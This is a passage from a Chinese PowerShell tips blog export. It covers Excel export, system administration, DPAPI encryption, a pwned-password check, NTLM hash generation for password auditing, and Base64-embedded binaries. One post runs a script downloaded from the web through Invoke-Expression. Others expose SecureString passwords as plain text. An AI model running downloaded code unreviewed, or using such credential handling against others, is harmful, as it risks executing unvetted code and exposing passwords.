就可以正确地显示数组，即逗号分隔值的列表。 但是，如果希望在单独的行中显示数组元素，并使用换行符呢? 默认情况下，Excel 只会在选定单元格的输入框中显示单独的行，而不是在所有单元格中： 1234567891011121314151617181920212223# get some raw data that contains arrays$rawData = Get-EventLog -LogName System -Newest 10 | Select-Object -Property TimeWritten, ReplacementStrings, InstanceId# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$sheetName = 'Testdata'$rawData | ForEach-Object { # convert column &quot;ReplacementStrings&quot; from array to string $_.ReplacementStrings = $_.ReplacementStrings -join &quot;`r`n&quot; # return the changed object $_ } | Export-Excel -Path $path -ClearSheet -WorksheetName $sheetName -Show 当您运行这段代码时，”ReplacementStrings” 中的数组将会正确地转换为多行文本，但是您不会在工作表中看到它。只有当您单击某个单元格时才会看到输入区域中显示多行文本。 当您把我们前面部分的信息组合起来时，可以很容易地对 Excel 文件进行后期处理，并像这样将单元格格式化为“文本”和“自动换行”： 12345678910111213141516171819202122232425262728293031323334# get some raw data that contains arrays$rawData = Get-EventLog -LogName System -Newest 10 | Select-Object -Property TimeWritten, ReplacementStrings, InstanceId# create this Excel file$Path = &quot;$env:temp\\report.xlsx&quot;# make sure the file is deleted so we have no# effects from previous data still present in the# file. This requires that the file is not still# open and locked in Excel$exists = Test-Path -Path $Pathif ($exists) { Remove-Item -Path $Path}$sheetName = 'Testdata'# save the Excel object model by using -PassThru instead of -Show$excel = $rawData | ForEach-Object { # convert column &quot;ReplacementStrings&quot; from array to string $_.ReplacementStrings = $_.ReplacementStrings -join &quot;`r`n&quot; # return the changed object $_ } | Export-Excel -Path $path -ClearSheet -WorksheetName $sheetName -AutoSize -PassThru#region Post-process the column with the misinterpreted formulas# remove the region to repro the original Excel error$sheet1 = $excel.Workbook.Worksheets[$sheetName]# reformat cell to number type &quot;TEXT&quot; with WordWrap and AutoSizeSet-Format -Address $sheet1.Cells['B:B'] -NumberFormat 'Text' -WrapText -AutoSize#endregionClose-ExcelPackage -ExcelPackage $excel -Show","link":"/2019/09/05/using-awesome-export-excel-cmdlet-part-5/"},{"title":"PowerShell 技能连载 - 重设 Winsock","text":"PowerShell 既可以运行内置的 PowerShell 命令，也可以运行常规的控制台命令，所以继续用控制台命令处理已知的任务也不是件坏事。 例如，如果您希望重设 winsock，以下是一个可信赖的解决方案： 1234#requires -RunAsAdministratornetsh winsock resetnetsh int ip reset 请注意这段代码需要管理员特权，并且可能需要重启才能生效。","link":"/2019/09/09/resetting-winsock/"},{"title":"PowerShell 技能连载 - 检测存储问题","text":"在 Windows 10 和 Windows Server 2016 中，PowerShell 可以访问存储可靠性数据，这样您就可以发现其中一个附加的存储驱动器是否有问题。这需要管理员特权来执行： 123456PS&gt; Get-PhysicalDisk | Get-StorageReliabilityCounterDeviceId Temperature ReadErrorsUncorrected Wear PowerOnHours-------- ----------- --------------------- ---- ------------0 01 0 要查看所有可用信息，请使用 Select-Object： 1234567891011121314151617181920212223242526272829303132333435363738394041424344PS&gt; Get-PhysicalDisk | Get-StorageReliabilityCounter | Select-Object -Property *(...)DeviceId : 0FlushLatencyMax : 104LoadUnloadCycleCount :LoadUnloadCycleCountMax :ManufactureDate :PowerOnHours :ReadErrorsCorrected :ReadErrorsTotal :ReadErrorsUncorrected :ReadLatencyMax : 1078StartStopCycleCount :StartStopCycleCountMax :Temperature : 1TemperatureMax : 1Wear : 0WriteErrorsCorrected :WriteErrorsTotal :WriteErrorsUncorrected :WriteLatencyMax : 1128(...)FlushLatencyMax :LoadUnloadCycleCount :LoadUnloadCycleCountMax :ManufactureDate :PowerOnHours :ReadErrorsCorrected :ReadErrorsTotal :ReadErrorsUncorrected :ReadLatencyMax : 46StartStopCycleCount :StartStopCycleCountMax :Temperature : 0TemperatureMax : 0Wear : 0WriteErrorsCorrected :WriteErrorsTotal :WriteErrorsUncorrected :WriteLatencyMax :PSComputerName :(...) 详情和返回数据的数量取决于您的存储制造商和您的驱动器。","link":"/2019/09/11/detecting-storage-issues/"},{"title":"PowerShell 技能连载 - 检测键盘按键","text":"通常，只有在真正的控制台窗口中才支持按键检测，因此这种方法不适用于 PowerShell ISE 和其他 PowerShell 宿主。 但是，PowerShell 可以从 Windows Presentation Foundation 中借用一种类型，这种类型可以检查任何键的状态。这样，实现在任何 PowerShell 脚本中都可以工作的“退出”键就变得很简单了，无论是在控制台、Visual Studio Code 还是 PowerShell ISE 中运行： 1234567891011121314151617181920Add-Type -AssemblyName WindowsBaseAdd-Type -AssemblyName PresentationCore# choose the abort key$key = [System.Windows.Input.Key]::LeftCtrlWrite-Warning &quot;PRESS $key TO ABORT!&quot;do{ $isCtrl = [System.Windows.Input.Keyboard]::IsKeyDown($key) if ($isCtrl) { Write-Host Write-Host &quot;You pressed $key, so I am exiting!&quot; -ForegroundColor Green break } Write-Host &quot;.&quot; -NoNewline Start-Sleep -Milliseconds 100} while ($true) 只需要在变量 $key 中选择“退出”按键即可。本例使用的是左 CTRL 键。","link":"/2019/09/13/detecting-key-press-1/"},{"title":"PowerShell 技能连载 - 实时日志处理","text":"PowerShell 提供了一种强大而简单的方法来监视文件更改。假设您有一个经常更改的日志文件。以下是一个PowerShell脚本，用于监视日志文件的更改。每当发生更改时，都会执行一些代码: 1234567# make sure this points to a log file$Path = '\\\\myserver\\report2.txt'Get-Content -Path $Path -Tail 0 -Wait |ForEach-Object { &quot;Detected $_&quot;} 只要确保修改 $path 指向某个实际的日志文件。每当向文件附加文本（并且保存更改），ForEach-Object 循环都会执行脚本块并输出 “Detected “。通过这种方式，您可以方便地响应实际的改变。 Get-Content 完成繁重的工作：-Wait 启用内容监视，-Tail 0 确保忽略现有内容，只查找新添加的文本。","link":"/2019/09/17/real-time-log-processing/"},{"title":"PowerShell 技能连载 - 查找公网 IP 地址","text":"这是一个单行程序，检索您当前的公共IP地址： 12345678910111213PS&gt; Invoke-RestMethod -Uri http://ipinfo.ioip : 87.153.224.209hostname : p5799e0d1.dip0.t-ipconnect.decity : Hannoverregion : Lower Saxonycountry : DEloc : 52.3705,9.7332org : AS3320 Deutsche Telekom AGpostal : 30159timezone : Europe/Berlinreadme : https://ipinfo.io/missingauth","link":"/2019/09/19/finding-public-ip-address-1/"},{"title":"PowerShell 技能连载 - 安装 PowerShell Core","text":"您也许知道，Windows PowerShell（随 Windows 分发的）已成为过去，所有的工作都投入到新的跨平台 PowerShell Core 的开发中。新版的 PowerShell 还没有在 Windows 中提供开箱即用的功能，所以如果要使用它，您需要手动下载。 幸运的是，有一个脚本可以为您完成繁重的工作。这是用来下载该脚本的代码： 1Invoke-RestMethod https://aka.ms/install-powershell.ps1 如果您希望将该脚本保存到一个文件，请使用以下代码： 1234$Path = &quot;$home\\desktop\\installps.ps1&quot;Invoke-RestMethod https://aka.ms/install-powershell.ps1 | Set-Content -Path $Path -Encoding UTF8notepad $Path 这将下载该脚本并在一个记事本中打开该脚本。该脚本文件存放在桌面上，这样您可以用鼠标右键单击它并使用 PowerShell 执行它来下载并安装最新生产版的 PowerShell Core。","link":"/2019/09/23/installing-powershell-core/"},{"title":"PowerShell 技能连载 - 使用最新版的 PowerShell Core","text":"在前一个技能中我们演示了如何下载一个 PowerShell 脚本，用来自动下载最新版的 PowerShell Core。 这个脚本支持一系列参数。默认情况下，它获取最新（稳定版）的生产版本。如果您希望使用包括预览版的最新版，请使用 -Preview 参数。并且，如果您希望使用 MSI 包安装它，请加上 -MSI 参数。 您不一定要将该脚本保存到文件。您可以直接执行下载脚本并通过 Invoke-Expression 执行它。不过，这个 cmdlet 被认为是有风险的，因为它直接执行您提交的任何代码，而没有机会让您事先检查代码。 以下是一行示例代码，用来下载最新版的 PowerShell Core MSI 安装包： 1Invoke-Expression -Command &quot;&amp; { $(Invoke-RestMethod https://aka.ms/install-powershell.ps1) } -UseMSI -Preview&quot;","link":"/2019/09/25/playing-with-latest-powershell-core-version/"},{"title":"PowerShell 技能连载 - 使用 Windows 10 内置的 SSH 支持","text":"在 2018 年 10 月份，一个 Windows 10 更新加入了内置的 SSH 支持。从此之后，Windows 10 附带了一个名为 “ssh” 的命令行工具。您可以在 PowerShell 中使用它来连接到其它设备（包括 IoT、树莓派等设备）而不需要第三方工具： 123456789PS&gt; sshusage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file] [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination [command]PS&gt;","link":"/2019/09/27/built-in-ssh-support-in-windows-10/"},{"title":"PowerShell 技能连载 - 在 PowerShell 脚本中嵌入二进制文件（图片、DLL）","text":"如果脚本需要外部二进制资源，例如图片或者 DLL 文件，您当然可以将它们和脚本一起分发。不过，您也可以将这些二进制文件作为文本嵌入您的脚本文件： 以字节方式读取二进制文件 将字节保存为 Base64 编码的字符串 通过这种方式，您的脚本可以从一个文本变量中读取 Base64 编码的二进制，然后将数据转换回字节，并且将它们写入临时文件。 以下是两个演示该概念的函数： 1234567891011121314151617181920212223242526272829function Convert-BinaryToText{ param ( [Parameter(Mandatory)] [string] $Path ) $Bytes = [System.IO.File]::ReadAllBytes($Path) [System.Convert]::ToBase64String($Bytes)}function Convert-TextToBinary{ param ( [Parameter(Mandatory)] [string] $Text, [Parameter(Mandatory)] [string] $OutputPath ) $Bytes = [System.Convert]::FromBase64String($Text) [System.IO.File]::WriteAllBytes($OutputPath, $Bytes)} Convert-BinaryToText 接受一个任意文件的路径，并返回 Base64 编码的字符串。Convert-BinaryToText 做的是相反的操作：传入 Base64 编码的字符串以及一个目标路径，该函数将自动重建二进制文件。 请注意将二进制文件保存成 Base64 字符串并不能节省空间。您的脚本的大小可能会超过原来的二进制文件大小。但是，即使 Base64 编码的字符串很大，PowerShell也能很好地处理它们，而且从 Base64 编码的字符串中提取二进制文件非常快。","link":"/2019/10/01/embedding-binaries-pictures-dlls-in-powershell-scripts/"},{"title":"PowerShell 技能连载 - 将 SecureString 转换为文本","text":"将加密的 SecureString 转换回纯文本非常有用。例如，通过这种方式，您可以使用 PowerShell 的“遮罩输入”特性。只需请求一个 SecureString, PowerShell 就会屏蔽用户输入的显示。接下来，将 SecureString 转换成纯文本，这样就可以在内部使用它来做任何您想做的事情： 1234567891011121314151617181920function Convert-SecureStringToText{ param ( [Parameter(Mandatory,ValueFromPipeline)] [System.Security.SecureString] $Password ) process { $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password) [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) }}$password = Read-Host -Prompt 'Enter password' -AsSecureString$plain = Convert-SecureStringToText -Password $password&quot;You entered: $plain&quot; 如果你想知道为什么一开始就可以将 SecureString 转换成纯文本，那么请注意：SecureString 只保护第三方的字符串内容，即“中间人”攻击。它绝不是保护真正输入密码的人。 这也体现了为什么使用凭据有风险。当一个脚本请求凭据时，脚本总是可以获取整个密码： 123$cred = Get-Credential -UserName $env:USERNAME -Message 'Enter your password'$plain = Convert-SecureStringToText -Password $cred.Password&quot;You entered: $plain&quot; 实际上，通过凭据对象，要获取输入的密码更容易，因为它有一个内置的方法实现这个功能： 123$cred = Get-Credential -UserName $env:USERNAME -Message 'Enter your password'$plain = $cred.GetNetworkCredential().Password&quot;You entered: $plain&quot; 当一个脚本请求凭据时，请确保信任该脚本（的作者）。","link":"/2019/10/03/converting-securestring-to-text/"},{"title":"PowerShell 技能连载 - 测试","text":"在之前的技能中，我们讨论过了类似 haveIbeenpwned.com 的服务。它们从之前的黑客攻击中收集泄露的密码，这样您就可以检查您的密码是否已被泄露，并可能被包括在未来的字典攻击中。 以下是两个有用的函数：Test-Password 请求一个 SecureString。当您收到提示时，输入将会被屏蔽。接下来 Convert-SecureStringToText 将会将整个密码转为纯文本。然后 Test-Password 将把输入的整个密码进行哈希运算，并只发送前 5 个字节到 WEB 服务。您的原始密码永远不会泄露。 Web 服务将返回所有以该 5 个字节开头的泄露的密码哈希，这样您就可以检查返回的哈希中是否包含您的哈希。 如果您的密码在之前的攻击中出现，那么您将受到它在攻击中出现的次数。任何返回大于 0 的数字的密码都必须视为不安全的，并且不该使用。 请记住：当某个密码返回一个大于 0 的数字时，这并不意味着您的密码被破解了。它的意思是，在世界上所有地方中，您的密码在攻击中出现，所以要么您或者其他人使用它并且被黑客攻击：该密码现在不安全并且已成为攻击字典的一部分，黑客会尝试账户。如果您继续使用这个密码，黑客有可能在不就得将来利用简单（快速）的字典攻击来破解它。 在之前的提示中，我们已经讨论了haveIbeenpwned.com等服务。他们从以前的黑客攻击中收集泄露的密码，这样你就可以检查你的密码是否已被泄露，并可能被包括在未来的字典攻击中。 下面有两个有用的函数:Test-Password请求SecureString，因此当您收到提示时，您的输入将被屏蔽。然后将输入的密码转换为纯文本。然后，Test-Password散列您输入的密码，只将前5个字节发送给web服务。您的原始密码永远不会泄露。 web服务将返回所有以您的5个字节开头的密码散列，因此您可以检查返回的散列是否与您的散列匹配。 如果您的密码在以前的攻击中被发现，您将收到它参与攻击的次数。任何返回大于0的数字的密码都被认为是不安全的，不应该使用。 请记住:当密码返回一个大于0的数字时，这并不意味着您自己的密码被破解了。它的意思是，在世界上任何地方，你的密码在攻击中出现，所以要么你或其他人使用它并被黑客攻击。无论是你还是别人:这个密码现在是不安全的，因为它成为黑客攻击字典的一部分，黑客会尝试帐户。如果你继续使用这个密码，黑客很有可能在不久的将来利用简单(快速)的字典攻击来破解它。 12345678910111213141516171819202122232425262728function Convert-SecureStringToText{ param ( [Parameter(Mandatory,ValueFromPipeline)] [System.Security.SecureString] $Password ) process { $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password) [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) }}function Test-Password{ [CmdletBinding()] param ( [Parameter(Mandatory, Position=0)] [System.Security.SecureString] $Password ) $plain = $Password | Convert-SecureStringToText $bytes = [Text.Encoding]::UTF8.GetBytes($plain) $stream = [IO.MemoryStream]::new($bytes) $hash = Get-FileHash -Algorithm 'SHA1' -InputStream $stream $stream.Close() $stream.Dispose() $first5hashChars,$remainingHashChars = $hash.Hash -split '(?&lt;=^.{5})' $url = &quot;https://api.pwnedpasswords.com/range/$first5hashChars&quot; [Net.ServicePointManager]::SecurityProtocol = 'Tls12' $response = Invoke-RestMethod -Uri $url -UseBasicParsing $lines = $response -split '\\r\\n' $filteredLines = $lines -like &quot;$remainingHashChars*&quot; [int]($filteredLines -split ':')[-1]}","link":"/2019/10/07/testing-password-strength/"},{"title":"PowerShell 技能连载 - 简易的 PowerShell 聊天室","text":"以下是一个有趣的 PowerShell 脚本，您可以用它来创建一个简易的多频道聊天室。您所需的只是一个所有人都有读写权限的网络共享目录。 该聊天室是基于文件的，并且使用 PowerShell 的功能来监视文件的改变。所以基本上，每个聊天频道是一个文本文件，并且无论何时，如果某人想“说”一些内容，那么就会向文件中添加一行。任何连接到该聊天频道的人实际上都在监视这个文件的改变。 显然，这个“聊天室”只适用于试验，并且有许多限制。例如，当某人在写文件时，其他人无法同时写入。但是，它很好地说明了 PowerShell 如何监视文件并在添加新文本时采取行动。您也可以将这个技术用在日志文件上：PowerShell 可以在日志文件有新内容的时候通知您，并且甚至自动过滤新增加的文本并根据触发关键字发出警告或采取行动。 在开始之前，请确保调整 ServerShare 并将它设置为一个可读写的网络共享目录。 下一步，您可以这样进入聊天室： 1Enter-Chat -ChatChannelName lunchbreak -Name Tobias -ShowOldPosts -ShowOldPosts 显示已有的聊天信息。如果没有添加这个参数，那么只能看见新的信息。无论何时运行 Enter-Chat，它都会检查在 -ChatChannelName 中指定名称的文件，如果该文件不存在，就会创建它。 Get-ChatChannel 列出共享目录中的所有聊天文件，以及聊天室最后使用的时间。该信息完全取自文件属性 (LastWriteTime)。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# make sure you adjust this path# it must point to a network share where you have read and write permissions$ServerShare = &quot;\\\\myserver\\chathome&quot;function Enter-Chat{ param ( [Parameter(Mandatory)] [string] $ChatChannelName, [string] $Name = $env:USERNAME, [Switch] $ShowOldPosts, $HomeShare = $ServerShare ) if ($ShowOldPosts) { $Option = '' } else { $Option = '-Tail 0' } $Path = Join-Path -Path $HomeShare -ChildPath &quot;$ChatChannelName.txt&quot; $exists = Test-Path -Path $Path if ($exists -eq $false) { $null = New-Item -Path $Path -Force -ItemType File } $process = Start-Process -FilePath powershell -ArgumentList &quot;-noprofile -windowstyle hidden -command Get-COntent -Path '$Path' $Option -Wait | Out-GridView -Title 'Chat: [$ChatChannelName]'&quot; -PassThru Write-Host &quot;To exit, enter: quit&quot; &quot;[$Name entered the chat]&quot; | Add-Content -Path $Path do { Write-Host &quot;[$ChatChannelName]: &quot; -ForegroundColor Green -NoNewline $inputText = Read-Host $isStopCommand = 'quit','exit','stop','leave' -contains $inputText if ($isStopCommand -eq $false) { &quot;[$Name] $inputText&quot; | Add-Content -Path $Path } } until ($isStopCommand -eq $true) &quot;[$Name left the chat]&quot; | Add-Content -Path $Path $process | Stop-Process}function Get-ChatChannel{ param ( $HomeShare = $ServerShare ) Get-ChildItem -Path $HomeShare -Filter *.txt -File | ForEach-Object { [PSCustomObject]@{ ChannelName = [System.IO.Path]::GetFileNameWithoutExtension($_.Name) LastActive = $_.LastWriteTime Started = $_.CreationTime } }}","link":"/2019/10/09/simple-powershell-chat/"},{"title":"PowerShell 技能连载 - 创建 NT4 密码哈希","text":"在内部，ActiveDirectory 将所有密码存储为所谓的 NTLM 哈希。有许多安全分析工具可以读取和转储这些哈希。 幸运的是，没有可行的方法来解密这些散列并检索原始密码，您可以使用（已知）密码并将其转换为 NTLM 哈希。这是字典攻击的基本过程：他们获取到很长的“已知密码”列表，将它们转换为 NTLM 散列，当它们与实际的 AD 帐户散列匹配时，就算破解出了密码。 这样，您的安全部门就可以将密码黑名单中的不安全密码(如“P@ssw0rd”)转换为NTLM散列，并将它们与Active Directory的密码散列进行比较，以识别需要更改密码的帐户。 这是将纯文本变为 NTLM HASH 的 PowerShell 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127function ConvertTo-NTLMPasswordHash{ #Work based on code found here: https://www.myotherpcisacloud.com/post/getmd4hash #Original Author: Ryan Ries, 2014 param( [Parameter(Mandatory=$true)][string]$password ) Function Get-MD4Hash { Param ([Parameter(Mandatory=$True, ValueFromPipeline=$False)] [Byte[]]$DataToHash) Set-StrictMode -Version Latest Add-Type -TypeDefinition @' using System; using System.Text; using System.Runtime.InteropServices; public class BCrypt { [DllImport(&quot;bcrypt.dll&quot;, CharSet = CharSet.Auto)] public static extern NTStatus BCryptOpenAlgorithmProvider( [Out] out IntPtr phAlgorithm, [In] string pszAlgId, [In, Optional] string pszImplementation, [In] UInt32 dwFlags); [DllImport(&quot;bcrypt.dll&quot;)] public static extern NTStatus BCryptCloseAlgorithmProvider( [In, Out] IntPtr hAlgorithm, [In] UInt32 dwFlags); [DllImport(&quot;bcrypt.dll&quot;, CharSet = CharSet.Auto)] public static extern NTStatus BCryptCreateHash( [In, Out] IntPtr hAlgorithm, [Out] out IntPtr phHash, [Out] IntPtr pbHashObject, [In, Optional] UInt32 cbHashObject, [In, Optional] IntPtr pbSecret, [In] UInt32 cbSecret, [In] UInt32 dwFlags); [DllImport(&quot;bcrypt.dll&quot;)] public static extern NTStatus BCryptDestroyHash( [In, Out] IntPtr hHash); [DllImport(&quot;bcrypt.dll&quot;)] public static extern NTStatus BCryptHashData( [In, Out] IntPtr hHash, [In, MarshalAs(UnmanagedType.LPArray)] byte[] pbInput, [In] int cbInput, [In] UInt32 dwFlags); [DllImport(&quot;bcrypt.dll&quot;)] public static extern NTStatus BCryptFinishHash( [In, Out] IntPtr hHash, [Out, MarshalAs(UnmanagedType.LPArray)] byte[] pbInput, [In] int cbInput, [In] UInt32 dwFlags); [Flags] public enum AlgOpsFlags : uint { BCRYPT_PROV_DISPATCH = 0x00000001, BCRYPT_ALG_HANDLE_HMAC_FLAG = 0x00000008, BCRYPT_HASH_REUSABLE_FLAG = 0x00000020 } // This is a gigantic enum and I don't want to copy all of it into this Powershell script. // Basically anything other than zero means something went wrong. public enum NTStatus : uint { STATUS_SUCCESS = 0x00000000 } }'@ [Byte[]]$HashBytes = New-Object Byte[] 16 [IntPtr]$PHAlgorithm = [IntPtr]::Zero [IntPtr]$PHHash = [IntPtr]::Zero $NTStatus = [BCrypt]::BCryptOpenAlgorithmProvider([Ref] $PHAlgorithm, 'MD4', $Null, 0) If ($NTStatus -NE 0) { Write-Error &quot;BCryptOpenAlgorithmProvider failed with NTSTATUS $NTStatus&quot; If ($PHAlgorithm -NE [IntPtr]::Zero) { $NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0) } Return } $NTStatus = [BCrypt]::BCryptCreateHash($PHAlgorithm, [Ref] $PHHash, [IntPtr]::Zero, 0, [IntPtr]::Zero, 0, 0) If ($NTStatus -ne 0) { Write-Error &quot;BCryptCreateHash failed with NTSTATUS $NTStatus&quot; If ($PHHash -ne [IntPtr]::Zero) { $NTStatus = [BCrypt]::BCryptDestroyHash($PHHash) } If ($PHAlgorithm -ne [IntPtr]::Zero) { $NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0) } Return } $NTStatus = [BCrypt]::BCryptHashData($PHHash, $DataToHash, $DataToHash.Length, 0) $NTStatus = [BCrypt]::BCryptFinishHash($PHHash, $HashBytes, $HashBytes.Length, 0) If ($PHHash -NE [IntPtr]::Zero) { $NTStatus = [BCrypt]::BCryptDestroyHash($PHHash) } If ($PHAlgorithm -NE [IntPtr]::Zero) { $NTStatus = [BCrypt]::BCryptCloseAlgorithmProvider($PHAlgorithm, 0) } $HashString = New-Object System.Text.StringBuilder Foreach ($Byte In $HashBytes) { $null = $HashString.Append($Byte.ToString(&quot;x2&quot;)) } $HashString.ToString() } Get-MD4Hash -DataToHash ([System.Text.Encoding]::Unicode.getBytes($password))}","link":"/2019/10/11/creating-nt4-password-hashes/"},{"title":"PowerShell 技能连载 - 加密文本（第 1 部分）","text":"让我们来看看一种在计算机上加密文本的安全方法。以下的 Protect-Text 函数接受任意文本，并自动加密，不需要密码。它不使用密码，而是使用您的用户帐户和机器，或者只使用您的机器作为密钥。 如果使用 -Scope LocalMachine，任何使用该机器的人都可以解密该文本，但如果该文本泄露给其他人，它无法在其它机器上解密。如果您使用 -Scope CurrentUser，只有加密者可以解密，并且只能在加密的机器上解密。这个加密方案很适合保存您的私人密码。 此外，为了提高安全性，可以在顶部添加（可选）密码。当指定了密码时，将应用上述相同的限制，但此外还需要知道密码才能解密文本。 请注意您也可以控制文本解码。请确保加密和解密使用相同的编码。 以下是加密函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function Protect-Text{ [CmdletBinding()] param ( [Parameter(Mandatory=$true,ValueFromPipeline=$true)] [String] $SecretText, [string] $Password='', [string] [ValidateSet('CurrentUser','LocalMachine')] $scope = 'CurrentUser', [string] [ValidateSet('UTF7','UTF8','UTF32','Unicode','ASCII','Default')] $Encoding = 'Default', [Switch] $ReturnByteArray ) begin { Add-Type -AssemblyName System.Security if ([string]::IsNullOrEmpty($Password)) { $optionalEntropy = $null } else { $optionalEntropy = [System.Text.Encoding]::$Encoding.GetBytes($Password) } } process { try { $userData = [System.Text.Encoding]::$Encoding.GetBytes($SecretText) $bytes = [System.Security.Cryptography.ProtectedData]::Protect($userData, $optionalEntropy, $scope) if ($ReturnByteArray) { $bytes } else { [Convert]::ToBase64String($bytes) } } catch { throw &quot;Protect-Text: Unable to protect text. $_&quot; } } 结果类似这样： 1234PS&gt; Protect-Text -SecretText 'I am encrypted' -scope LocalMachineAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAF8Hpm9A5A0upZysoxLlvgwQAAAACAAAAAAAQZgAAAAEAACAAAACbOsUoDuZJXNkWIzfAABxktVg+Txn7A8RzSCvFP7I9YQAAAAAOgAAAAAIAACAAAABz7G7Tpuoje9meLOuugzx1WSoOUfaBtGPM/XZHytjC8hAAAAApt/TDhJ9EqeWEPLIDkd4bQAAAAAN0Q503Pa7XMxIMOnaO7qd3LKXJa4qhht+jc+Z0HaaV5/md83ipP1vefYAAUXdj8qv4eREeCBSGMqvKjbaOsOg= 如果您想了解如何将 Base64 编码的文本转换回原始文本，请看我们的下一个技能！","link":"/2019/10/15/encrypting-text-part-1/"},{"title":"PowerShell 技能连载 - 加密文本（第 2 部分）","text":"这是我们的加密解密系列的第二部分。在第一部分中您学到了如何在一台计算机中安全地加密文本。现在我们来关注解密部分。 要正确地解密文本，必须指定加密时使用的相同编码。基于您的加密参数，您必须指定相同的密码。并且基于 -Scope 设置，解密将只能针对您和/或仅在您加密文本的同一机器上工作。 以下是 Unprotect-Text 函数。我们也从上一个技能中复制了 Protect-Text 函数，这样您可以方便地使用这两种功能： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119function Protect-Text{ [CmdletBinding()] param ( [Parameter(Mandatory=$true,ValueFromPipeline=$true)] [String] $SecretText, [string] $Password='', [string] [ValidateSet('CurrentUser','LocalMachine')] $scope = 'CurrentUser', [string] [ValidateSet('UTF7','UTF8','UTF32','Unicode','ASCII','Default')] $Encoding = 'Default', [Switch] $ReturnByteArray ) begin { Add-Type -AssemblyName System.Security if ([string]::IsNullOrEmpty($Password)) { $optionalEntropy = $null } else { $optionalEntropy = [System.Text.Encoding]::$Encoding.GetBytes($Password) } } process { try { $userData = [System.Text.Encoding]::$Encoding.GetBytes($SecretText) $bytes = [System.Security.Cryptography.ProtectedData]::Protect($userData, $optionalEntropy, $scope) if ($ReturnByteArray) { $bytes } else { [Convert]::ToBase64String($bytes) } } catch { throw &quot;Protect-Text: Unable to protect text. $_&quot; } }}function Unprotect-Text{ [CmdletBinding(DefaultParameterSetName='Byte')] param ( [Parameter(Mandatory=$true,ValueFromPipeline=$true,ParameterSetName=&quot;Text&quot;, Position=0)] [string] $EncryptedString, [Parameter(Mandatory=$true,ValueFromPipeline=$true,ParameterSetName=&quot;Byte&quot;, Position=0)] [Byte[]] $EncryptedBytes, [string] $Password='', [string] [ValidateSet('CurrentUser','LocalMachine')] $scope = 'CurrentUser', [string] [ValidateSet('UTF7','UTF8','UTF32','Unicode','ASCII','Default')] $Encoding = 'Default' ) begin { Add-Type -AssemblyName System.Security if ([string]::IsNullOrEmpty($Password)) { $optionalEntropy = $null } else { $optionalEntropy = [System.Text.Encoding]::$Encoding.GetBytes($Password) } } process { try { if ($PSCmdlet.ParameterSetName -eq 'Text') { $inBytes = [Convert]::FromBase64String($EncryptedString) } else { $inBytes = $EncryptedBytes } $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($inBytes, $optionalEntropy, $scope) [System.Text.Encoding]::$Encoding.GetString($bytes) } catch { throw &quot;Unprotect-Text: Unable to unprotect your text. Check optional password, and make sure you are using the same encoding that was used during protection.&quot; } }} 以下是如何使用它的示例： 12345$text = &quot;This is my secret&quot;$a = Protect-Text -SecretText $text -scope CurrentUser -Password zumselUnprotect-Text -EncryptedString $a -scope CurrentUser -Password zumsel Protect-Text 创建了一个 Base64 编码的字符串，它可以用 Unprotect-Text 函数来解密。如果您不希望额外的密码，那么只能使用基于 -Scope 的缺省的保护。 要节省空间，您可以使用字节数组来代替 Base64 编码的字符串： 12$b = Protect-Text -SecretText $text -scope CurrentUser -ReturnByteArrayUnprotect-Text -EncryptedBytes $b -scope CurrentUser","link":"/2019/10/17/encrypting-text-part-2/"},{"title":"PowerShell 技能连载 - 对象的魔法（第 1 部分）","text":"在 PowerShell 中，大多数据是以 PSObject 来表示的，它是一个由 PowerShell 添加的特殊的对象“包装器”。要获取这个特殊的包装器，可以通过对象名为 “PSObject“ 的隐藏属性。让我们来看看： 1234567891011# get any object$object = Get-Process -Id $pid# try and access the PSObject$object.PSObject# get another object$object = &quot;Hello&quot;# try again$object.PSObject 如您所见，该 “PSObject“ 基本上是一个对象的描述。并且它包含了许多有用的信息。以下是一部分： 12345678910# get any object$object = Get-Process -Id $pid# try and access the PSObject$object.PSObject# find useful information$object.PSObject.TypeNames | Out-GridView -Title Type$object.PSObject.Properties | Out-GridView -Title Properties$object.PSObject.Methods | Out-GridView -Title Methods","link":"/2019/10/21/object-magic-part-1/"},{"title":"PowerShell 技能连载 - 对象的魔法（第 2 部分）","text":"通过隐藏的 “PSObject“ 属性，您可以获取对象成员的详细信息。例如，如果您希望知道哪个属性可以被改变，请试试这段代码： 12345# get any object$object = Get-Process -Id $pid# try and access the PSObject$object.PSObject.Properties.Where{$_.IsSettable}.Name 结果是进程对象的可以被赋值的属性列表： MaxWorkingSet MinWorkingSet PriorityBoostEnabled PriorityClass ProcessorAffinity StartInfo SynchronizingObject EnableRaisingEvents Site 类似地，您可以轻松地找出所有当前没有值（为空）的属性： 12345# get any object$object = Get-Process -Id $pid# try and access the PSObject$object.PSObject.Properties.Where{$null -eq $_.Value}.Name","link":"/2019/10/23/object-magic-part-2/"},{"title":"PowerShell 技能连载 - 对象的魔法（第 3 部分）","text":"假设您希望隐藏对象所有没有值（为空）的属性。以下是一个简单的实现： 123456# get any object$object = Get-Process -Id 